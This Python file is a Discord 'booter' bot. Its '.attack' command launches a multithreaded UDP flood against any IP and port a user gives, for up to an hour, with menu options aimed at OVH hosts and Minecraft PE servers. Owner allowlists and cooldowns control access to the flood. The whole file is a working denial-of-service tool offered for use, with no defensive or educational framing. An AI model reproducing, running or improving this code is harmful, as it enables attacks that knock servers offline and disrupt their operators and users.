import discord
from discord.ext import commands
import socket
import random
import time
import threading
import asyncio
import os

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

OWNER_IDS = {1102257907522863175, 1384269349484888148}
permissoes = set()
ataque_em_andamento = False
evento_parada = None
atualmente_atacando = None
cooldowns = {}

CONFIG_UDP = {
    "sockets": 200,  # equilibrado: alto rendimiento sin sobrecarga
    "packet_sizes": [32, 64],
    "threads": 6,
    "burst_size": 300,
    "sleep_time": 0.000001
}

metodos_validos = {
    "UDPNUKE": "Flood UDP potente",
    "UDPBOMB": "Flood UDP rápido",
    "UDP-BOT": "Ataque UDP efetivo",
    "TCP-BOT": "Ataque TCP",
    "MCPE": "Minecraft PE",
    "UDPRAW": "UDP com RAW",
    "TCPBYPASS": "TCP Bypass",
    "OVH": "Para OVH"
}

class AtaqueLocalUDP:
    def __init__(self):
        self.payloads = {
            size: random._urandom(size)
            for size in CONFIG_UDP["packet_sizes"]
        }

    def atacar(self, ip, porta, evento_parada):
        sockets = []
        for _ in range(CONFIG_UDP["sockets"] // CONFIG_UDP["threads"]):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setblocking(False)
                sockets.append(s)
            except:
                continue

        while not evento_parada.is_set():
            for s in sockets:
                try:
                    for _ in range(CONFIG_UDP["burst_size"]):
                        tamanho = random.choice(CONFIG_UDP["packet_sizes"])
                        s.sendto(self.payloads[tamanho], (ip, porta))
                except:
                    pass
            time.sleep(CONFIG_UDP["sleep_time"])

def tem_permissao(user_id):
    return user_id in OWNER_IDS or user_id in permissoes

@bot.check
async def check_permissoes(ctx):
    if tem_permissao(ctx.author.id):
        return True
    else:
        await ctx.send("⛔ Você não tem permissão para usar comandos neste bot.")
        return False

@bot.command()
async def attack(ctx, ip: str = None, porta: int = None, tempo: int = None, metodo: str = None):
    global ataque_em_andamento, evento_parada, atualmente_atacando

    if None in (ip, porta, tempo, metodo):
        await ctx.send("❌ Uso correto: `.attack [ip] [porta] [tempo] [metodo]`")
        return

    metodo = metodo.upper()
    autor = ctx.author.id

    if tempo > 3600:
        await ctx.send("⛔ Máximo de tempo: 3600s.")
        return

    if metodo not in metodos_validos:
        await ctx.send("❌ Método inválido. Use `.methods` para ver os válidos.")
        return

    if autor in cooldowns and time.time() < cooldowns[autor]:
        restante = int(cooldowns[autor] - time.time())
        await ctx.send(f"⏳ Aguarde {restante}s para atacar novamente.")
        return

    if ataque_em_andamento:
        await ctx.send("🚫 Já há um ataque ativo.")
        return

    ataque_em_andamento = True
    atualmente_atacando = autor
    evento_parada = threading.Event()

    embed = discord.Embed(title="🚀 Ataque iniciado com sucesso!", color=0x00FF00)
    embed.add_field(name="IP", value=ip, inline=True)
    embed.add_field(name="PORT", value=str(porta), inline=True)
    embed.add_field(name="TEMPO", value=f"{tempo}s", inline=True)
    embed.add_field(name="MÉTODO", value=metodo, inline=True)
    embed.set_footer(text="Pulsar - Bot")  # Aquí está el footer corregido
    await ctx.send(embed=embed)

    udp = AtaqueLocalUDP()
    threads_locais = []
    for _ in range(CONFIG_UDP["threads"]):
        t = threading.Thread(target=udp.atacar, args=(ip, porta, evento_parada))
        t.start()
        threads_locais.append(t)

    await asyncio.sleep(tempo)
    evento_parada.set()
    for t in threads_locais:
        t.join(timeout=1)

    ataque_em_andamento = False
    atualmente_atacando = None
    cooldowns[autor] = time.time() + 30
    await ctx.send("✅ Ataque finalizado. Cooldown: 30s")

@bot.command()
async def stop(ctx):
    global ataque_em_andamento, atualmente_atacando

    if not ataque_em_andamento or atualmente_atacando != ctx.author.id:
        await ctx.send("⚠️ Nenhum ataque seu ativo.")
        return

    evento_parada.set()
    ataque_em_andamento = False
    atualmente_atacando = None
    cooldowns[ctx.author.id] = time.time() + 30
    await ctx.send("🛑 Ataque parado. Cooldown: 30s")

@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="📋 Métodos disponíveis", color=0x3498db)
    for metodo, desc in metodos_validos.items():
        embed.add_field(name=metodo, value=desc, inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot online como {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name=".attack"))

bot.run("")  # Cambia esto por tu token real
